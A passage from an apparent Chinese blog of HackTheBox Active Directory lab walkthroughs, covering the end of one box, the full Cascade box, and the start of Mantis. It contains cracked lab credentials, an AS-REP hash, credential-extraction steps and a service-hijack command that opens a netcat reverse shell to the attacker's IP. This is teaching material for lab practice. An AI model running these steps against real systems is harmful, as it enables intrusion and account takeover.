class="line">$krb5asrep$23$jorden@MEGACORP.LOCAL:6127c87770a9aed57005d987e2818bd2$b6a67b254f3670033f7f32d0da0a98deae8f8dbbbd71917d7e27b9ef57ff4a394af9046f1a7673137568f7572276cfaad5af44c4def95bdadeaca1dbbe31fce3c9414823286c8a8a350b7bddce823eb93d4289a49d1e8dae1654ee01cc64d744a088c9723bc5183c0a8d0128b9b394973cbdf7051400953c5e9c6250c191c020ad1bb13615a6a60f02539b169280384e47f5049f8ccc8f9c882918c7d740044118ef07d521344784d8717fb6f6223bdffd341d7334e50e184dfb3c390913381725c7bec1a212fa0a148287bebe6cac9c114974b08bc658c3acfc61ad18ade1bc1d9419790395ef5b16edc5e2145e11d0</span><br></pre></td></tr></table></figure><p>使用<code>john</code>尝试破解获取明文密码</p><p><code>john hash -w=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -w=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730174813435-1439858535.png" alt="image-20240730174800662"></p><p>得到<code>jorden</code>用户的明文密码：<code>rainforest786</code></p><p>利用<code>crackmapexec</code>验证是否能够远程登录</p><p><code>crackmapexec winrm 10.10.10.179 -u jorden -p &#39;rainforest786&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730175140880-587706820.png" alt="image-20240730175138971"></p><p>可以登录，直接利用<code>evil-winrm</code>登录</p><p><code>evil-winrm -i 10.10.10.179 -u jorden -p &#39;rainforest786&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730175305311-1791317928.png" alt="image-20240730175303829"></p><p>登陆成功</p><h1 id="AD域提权"><a href="#AD域提权" class="headerlink" title="AD域提权"></a>AD域提权</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先看一下该用户所拥有的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730180856080-662594263.png" alt="image-20240730180854225"></p><p>之前在<code>bloodhound</code>中提到过该用户属于<code>SERVER_OPERATORS</code>组（高权限组）</p><blockquote><p>Server Operators组：该组仅存在于域控制器上的内置组。默认情况下，该组没有成员。服务器操作员可以交互式登录到服务器；创建和删除网络共享；启动和停止服务；备份和恢复文件；格式化电脑硬盘；并关闭计算机。</p></blockquote><p>所以可以尝试利用一下该组权限</p><h2 id="滥用Server-Operators组权限实现权限提升"><a href="#滥用Server-Operators组权限实现权限提升" class="headerlink" title="滥用Server Operators组权限实现权限提升"></a>滥用Server Operators组权限实现权限提升</h2><ul><li>利用思路</li></ul><blockquote><p>可以找系统服务，将其执行改写，比如我让他去执行nc为我机器建立一个反向连接的shell，然后将服务重启，那么系统便会加载该服务并建立一个反向连接的shell给我的机器，该shell应该是系统级别的。</p></blockquote><p>首先通过<code>upload</code>将``nc64.exe传上去</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730181748748-1462306931.png" alt="image-20240730181747343"></p><p>经过多次测试后发现可以改变<code>browser</code>服务的路径</p><p><code>sc.exe config browser binPath= &quot;C:\Users\jorden\Documents\nc64.exe -e cmd.exe 10.10.14.3 80&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730183323514-296023642.png" alt="image-20240730183321829"></p><p>先在<code>kali</code>中设置监听</p><p><code>nc -lvp 80</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730183429220-759850834.png" alt="image-20240730183427653"></p><p>然后在靶机中手动重启<code>browser</code>服务</p><p><code>sc.exe stop browser</code></p><p><code>sc.exe start browser</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730183808518-2033487681.png" alt="image-20240730183806758"></p><p>此时<code>kali</code>中收到回显</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730184223527-981482744.png" alt="image-20240730184218688"></p><p>发现已经是<code>system</code>权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730193239799-1215521076.png" alt="image-20240730193237991"></p><p>最后在<code>C:\Users\Administrator\Desktop</code>目录下找到<code>root.txt</code></p><h1 id="其他提权方法"><a href="#其他提权方法" class="headerlink" title="其他提权方法"></a>其他提权方法</h1><h2 id="SeBackupPrivilege和SeRestorePrivilege权限的滥用"><a href="#SeBackupPrivilege和SeRestorePrivilege权限的滥用" class="headerlink" title="SeBackupPrivilege和SeRestorePrivilege权限的滥用"></a>SeBackupPrivilege和SeRestorePrivilege权限的滥用</h2><p>在对<code>jorden</code>用户信息搜集的时候，发现如下内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730193338002-1111181364.png" alt="image-20240730193320821"></p><p>发现该用户具有<code>SeBackupPrivilege</code>和<code>SeRestorePrivilege</code>权限</p><p>有了<code>SeBackupPrivilege</code>和<code>SeRestorePrivilege</code>这两个权限，就可以用<code>robocopy</code>来读取文件</p><p><code>robocopy /b C:\users\administrator\desktop C:\Users\jorden\Documents</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730193636356-418270461.png" alt="image-20240730193634029"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Cascade</title>
      <link href="/posts/7112d8f8.html"/>
      <url>/posts/7112d8f8.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.182</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>TightVNC密码破解</li><li>AD Recycle Bin滥用权限提升</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.182</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 11:27 CST</span><br><span class="line">Nmap scan report for 10.10.10.182</span><br><span class="line">Host is up (0.45s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">53/tcp    open     domain         Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)</span><br><span class="line">88/tcp    open     kerberos-sec   Microsoft Windows Kerberos (server time: 2024-07-22 03:28:03Z)</span><br><span class="line">135/tcp   open     msrpc          Microsoft Windows RPC</span><br><span class="line">389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open     microsoft-ds?</span><br><span class="line">464/tcp   filtered kpasswd5</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">636/tcp   open     tcpwrapped</span><br><span class="line">1337/tcp  filtered waste</span><br><span class="line">1433/tcp  filtered ms-sql-s</span><br><span class="line">3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open     tcpwrapped</span><br><span class="line">5722/tcp  filtered msdfsr</span><br><span class="line">5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">8080/tcp  filtered http-proxy</span><br><span class="line">9389/tcp  filtered adws</span><br><span class="line">47001/tcp filtered winrm</span><br><span class="line">49152/tcp filtered unknown</span><br><span class="line">49153/tcp filtered unknown</span><br><span class="line">49154/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line">49155/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line">49157/tcp open     ncacn_http     Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line">49167/tcp filtered unknown</span><br><span class="line">49172/tcp filtered unknown</span><br><span class="line">49173/tcp filtered unknown</span><br><span class="line">50255/tcp filtered unknown</span><br><span class="line">Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -1s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2:1:0:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-22T03:28:58</span><br><span class="line">|_  start_date: 2024-07-22T03:07:52</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 130.17 seconds</span><br></pre></td></tr></table></figure><p>从上述结果中可以发现，主机为<code>windows_server_2008</code>，域名是<code>cascade.local</code>，开启的服务有<code>DNS</code>服务、<code>Kerberos</code>服务、<code>rpc</code>服务、<code>ldap</code>服务、<code>SMB</code>服务、在<code>1433</code>端口上运行着<code>SQL Server</code>、在<code>8080</code>端口也有服务，但是大多数服务都被防火墙过滤了</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>直接测试smb能不能匿名登录</p><p><code>smbclient -N -L //10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722141009245-1281612221.png" alt="image-20240722140947016"></p><p>能成功登录但是获得不了什么重要的信息</p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p><code>rpc</code>看看能不能获取一些信息</p><p><code>rpcclient -U &quot;&quot; -N 10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722141314680-1424103600.png" alt="image-20240722141252468"></p><p>发现能获得一些用户名</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CascGuest</span><br><span class="line">arksvc</span><br><span class="line">s.smith</span><br><span class="line">r.thompson</span><br><span class="line">util</span><br><span class="line">j.wakefield</span><br><span class="line">s.hickson</span><br><span class="line">j.goodhand</span><br><span class="line">a.turnbull</span><br><span class="line">e.crowe</span><br><span class="line">b.hanson</span><br><span class="line">d.burman</span><br><span class="line">BackupSvc</span><br><span class="line">j.allen</span><br><span class="line">i.croft</span><br></pre></td></tr></table></figure><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p>用<code>ldapsearch</code>测试一下</p><p><code>ldapsearch -x -b &quot;dc=cascade,dc=local&quot; -H ldap://10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722150135151-525710537.png" alt="image-20240722150112607"></p><p>找到<code>Ryan Thompson</code>在<code>Cascade</code>上的用户名是<code>r.thompson</code>，这个名字之前<code>rpc</code>枚举出来过，同时发现在<code>`Ryan Thompson用户的最后一个数据项中有</code>cascadeLegacyPwd<code>数据，将其值</code>clk0bjVldmE=`进行解码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722145836886-812006840.png" alt="image-20240722145814808"></p><p>得到解密后的数据<code>rY4n5eva</code>，疑似<code>r.thompson</code>的密码</p><p>提交后发现这真是<code>Ryan Thompson</code>的密码</p><p>测试能不能连接</p><p><code>crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722150712665-1667520013.png" alt="image-20240722150650469"></p><h2 id="r-thompson-SMB"><a href="#r-thompson-SMB" class="headerlink" title="r.thompson-SMB"></a>r.thompson-SMB</h2><p>发现可以进行<code>smb</code>连接，用<code>smbmap</code>连接一下</p><p><code>smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722153218137-609195675.png" alt="image-20240722153155560"></p><p>通过 <code>smbmap</code> 可以看到，我们只对 <code>Data</code> 目录具有可读权限，尝试连接</p><p><code>smbclient \\\\10.10.10.182\\Data -U r.thompson</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722153846790-786836942.png" alt="image-20240722153817069"></p><p>测试后发现只对<code>IT</code>目录有访问权限，将文件下载到本地进行观察</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; mask <span class="string">&quot;&quot;</span></span><br><span class="line">smb: \&gt; recurse ON <span class="comment">#默认情况下递归选项是OFF,在 smb 提示符下输入 recurse ON命令会将此选项切换为ON</span></span><br><span class="line">smb: \&gt; prompt OFF <span class="comment">#默认情况下询问是否下载选项是ON,在 smb 提示符下输入prompt OFF命令会将此选项切换为OFF</span></span><br><span class="line">smb: \&gt; mget *<span class="comment">#此时可以在不询问的情况下递归下载data目录下的所有文件</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722162504399-800993694.png" alt="image-20240722162438200"></p><h1 id="共享文件夹Data分析"><a href="#共享文件夹Data分析" class="headerlink" title="共享文件夹Data分析"></a>共享文件夹Data分析</h1><h2 id="破解TightVNC密码"><a href="#破解TightVNC密码" class="headerlink" title="破解TightVNC密码"></a>破解TightVNC密码</h2><p>在查找文件时，发现在<code>IT/Temp/s.smith</code>目录的<code>Install.reg</code>文件中找到了一个vnc密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722164045214-1255540472.png" alt="image-20240722164021239"></p><p><code>&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f</code></p><p>正常的<code>hex</code>解密是解不出来的，去网上找一下<code>vnc</code>解密的工具</p><p><a href="https://github.com/jeroennijhof/vncpwd">vncpwd</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722184121545-909779804.png" alt="image-20240722184058650"></p><p>解密完成，发现明文密码<code>sT333ve2</code>，猜测是<code>s.smith</code>用户的</p><h2 id="临时账户TempAdmin"><a href="#临时账户TempAdmin" class="headerlink" title="临时账户TempAdmin"></a>临时账户TempAdmin</h2><p>在<code>/Data/IT/Email Archives/</code>目录下找到个文件<code>Meeting_Notes_June_2018.html</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722185451609-2123011953.png" alt="image-20240722185428846"></p><p>从邮件中，可以获取到的有效信息是，环境迁移时会使用临时账户<code>TempAdmin</code>，并且密码与常规<code>admin</code>密码相同,当环境迁移结束后会删除临时账户。</p><p>在<code>/Data/IT/Logs/Ark AD Recycle Bin</code>目录下发现<code>ArkAdRecycleBin.log</code>日志文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723104039743-140522147.png" alt="image-20240723104034284"></p><p>从日志中我们发现<code>TempAdmin</code>帐户已移至回收站</p><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="登录s-smith用户"><a href="#登录s-smith用户" class="headerlink" title="登录s.smith用户"></a>登录s.smith用户</h2><p>先利用<code>crackmapexec</code>测试能否通过<code>evil-winrm</code>登录<code>s.smith</code>用户</p><p><code>crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722190053646-898096504.png" alt="image-20240722190031059"></p><p>测试发现的确可以使用密码：<code>sT333ve2</code>通过<code>winRM</code>用<code>s.smith</code>账号进行远程登录</p><p><code>evil-winrm -u s.smith -p &#39;sT333ve2&#39; -i 10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722191054897-647149480.png" alt="image-20240722191053738"></p><p>成功登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722191134005-826162699.png" alt="image-20240722191133301"></p><p>在<code>s.smith</code>的<code>Desktop</code>目录找到<code>user.txt</code></p><p>同时发现一个可疑的软链接文件<code>WinDirStat.lnk</code></p><p>查看一下该用户所在组信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722192914972-506642969.png" alt="image-20240722192913858"></p><p>发现该用户并不在权限组中，但是发现该用户属于<code>Audit Share</code>组，接下来就可以访问<code>Audit</code>目录下的文件进行查看</p><h2 id="s-smith-SMB"><a href="#s-smith-SMB" class="headerlink" title="s.smith-SMB"></a>s.smith-SMB</h2><p>访问<code>Audit</code>目录</p><p><code>smbclient \\\\10.10.10.182\\Audit$ -U s.smith</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722194201797-1094652226.png" alt="image-20240722194200709"></p><p>登陆成功，还是老办法，将文件下载到本地查看</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; mask <span class="string">&quot;&quot;</span></span><br><span class="line">smb: \&gt; recurse ON <span class="comment">#默认情况下递归选项是OFF,在 smb 提示符下输入 recurse ON命令会将此选项切换为ON</span></span><br><span class="line">smb: \&gt; prompt OFF <span class="comment">#默认情况下询问是否下载选项是ON,在 smb 提示符下输入prompt OFF命令会将此选项切换为OFF</span></span><br><span class="line">smb: \&gt; mget *<span class="comment">#此时可以在不询问的情况下递归下载data目录下的所有文件</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722194913997-1071312517.png" alt="image-20240722194912751"></p><p>下载完成</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722195141176-321662553.png" alt="image-20240722195139213"></p><h2 id="Audit-db"><a href="#Audit-db" class="headerlink" title="Audit.db"></a>Audit.db</h2><p>首先就是在<code>DB</code>目录下找到数据库，试试能不能获取一些有用的信息 </p><p><code>sqlite3 Audit.db</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722200725849-1056528410.png" alt="image-20240722200724571"></p><p>只能从<code>Ldap</code>表中找到<code>Arksvc</code>用户名，密码破解不了</p><h2 id="CascAudit-exe文件分析"><a href="#CascAudit-exe文件分析" class="headerlink" title="CascAudit.exe文件分析"></a>CascAudit.exe文件分析</h2><p>继续看<code>Audit</code>目录下的文件，先看那个<code>.bat</code>文件</p><p><code>cat RunAudit.bat</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722200948420-1914062784.png" alt="image-20240722200947578"></p><p>发现<code>CascAudit.exe</code>以 <code>db</code> 文件作为参数运行，查看一下<code>CascAudit.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722201149933-116365236.png" alt="image-20240722201149317"></p><p>发现这是一个<code>.NET</code>的文件，利用工具调试一下</p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnSpy</a></p><p>把所属文件夹<code>dump</code>下来丢进<code>dnspy</code>动调一下，把断点打在断开数据库连接的地方想劫持一下<code>password</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722211926047-1402503370.png" alt="image-20240722211925250"></p><p>但是这块儿可能是我的<code>dnspy</code>有问题，一直卡在一个报错上了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722211944190-800938387.png" alt="image-20240722211943214"></p><p>索性直接逆，按照它的逻辑去找<code>password</code>加密的地方，双击跟进这个加密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722211956255-771745297.png" alt="image-20240722211955684"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212000049-1187622322.png" alt="image-20240722211959240"></p><p>明显的<code>AES</code>加密，给了秘钥和<code>iv</code>直接找个在线网站解了（注意先用<code>base64</code>解码）</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212036892-763850826.png" alt="image-20240722212036170"></p><p>这样我们就拿到了<code>Arksvc</code>的密码<code>w3lc0meFr31nd</code></p><p>拿到用户名密码，测试一下能不能<code>winrm</code>登录</p><p><code>crackmapexec winrm 10.10.10.182 -u Arksvc -p w3lc0meFr31nd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212516783-401250117.png" alt="image-20240722212515703"></p><p>可以登录，拿<code>evil-winrm</code>登录</p><p><code>evil-winrm -i 10.10.10.182 -u Arksvc -p w3lc0meFr31nd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212621095-1069117083.png" alt="image-20240722212620250"></p><p>登陆成功</p><h1 id="AD-Recycle-Bin滥用权限提升"><a href="#AD-Recycle-Bin滥用权限提升" class="headerlink" title="AD Recycle Bin滥用权限提升"></a>AD Recycle Bin滥用权限提升</h1><p>先看<code>Arksvc</code>用户有没有什么可以利用的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723100622343-929767262.png" alt="image-20240723100620239"></p><p>发现该用户属于 <code>AD Recycle Bin</code> 组下</p><blockquote><p>该组是用于恢复被删除的用户，组以及OU等对象的，这些对象在 <code>AD Recycle Bin</code> 中时保持其所有属性不变，这使得它们可以在任何时候被恢复。</p><p><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">参考链接</a></p></blockquote><p>前面已经知道两个重要信息，一个是管理员用户和<code>TempAdmin</code>密码一致，另一个是TempAdmin被移到了回收站</p><p>这里可以使用<code>Get-ADObject</code>枚举<code>AD</code>回收站中的对象，并过滤具有<code>isDeleted</code>属性的已删除对象即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADObject</span> <span class="literal">-filter</span> <span class="string">&#x27;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27;</span> <span class="literal">-includeDeletedObjects</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105119052-1568759036.png" alt="image-20240723105115495"></p><p>发现最后一条数据是我们之前提到的<code>TempAdmin</code>，获取该帐户的所有详细信息</p><p><code>Get-ADObject -filter &#123; SAMAccountName -eq &quot;TempAdmin&quot; &#125; -includeDeletedObjects -property *</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105313412-659440464.png" alt="image-20240723105310378"></p><p>注意到密码值很可能是<code>base64</code>编码，解码一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105357920-613810809.png" alt="image-20240723105356090"></p><p>获取<code>TempAdmin</code>的明文密码：<code>baCT3r1aN00dles</code></p><p>因为之前提到过<code>TempAdmin</code>的密码跟正常管理员密码一样，所以我们直接测试能否使用这个密码远程登陆<code>Administrator</code></p><p><code>crackmapexec winrm 10.10.10.182 -u Administrator -p baCT3r1aN00dles</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105753291-1398855670.png" alt="image-20240723105748085"></p><p>发现可以登录，我们直接登录<code>Administrator</code></p><p><code>evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105924743-1476469846.png" alt="image-20240723105922917"></p><p>登陆成功！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723110506025-2001758700.png" alt="image-20240723110503914"></p><p>最后在<code>Desktop</code>目录找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Mantis</title>
      <link href="/posts/662d550f.html"/>
      <url>/posts/662d550f.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.52</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>MS14-068权限提升</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.52</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 21:03 CST</span><br><span class="line">Nmap scan report for 10.10.10.52</span><br><span class="line">Host is up (0.41s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-18 13:03:51Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span 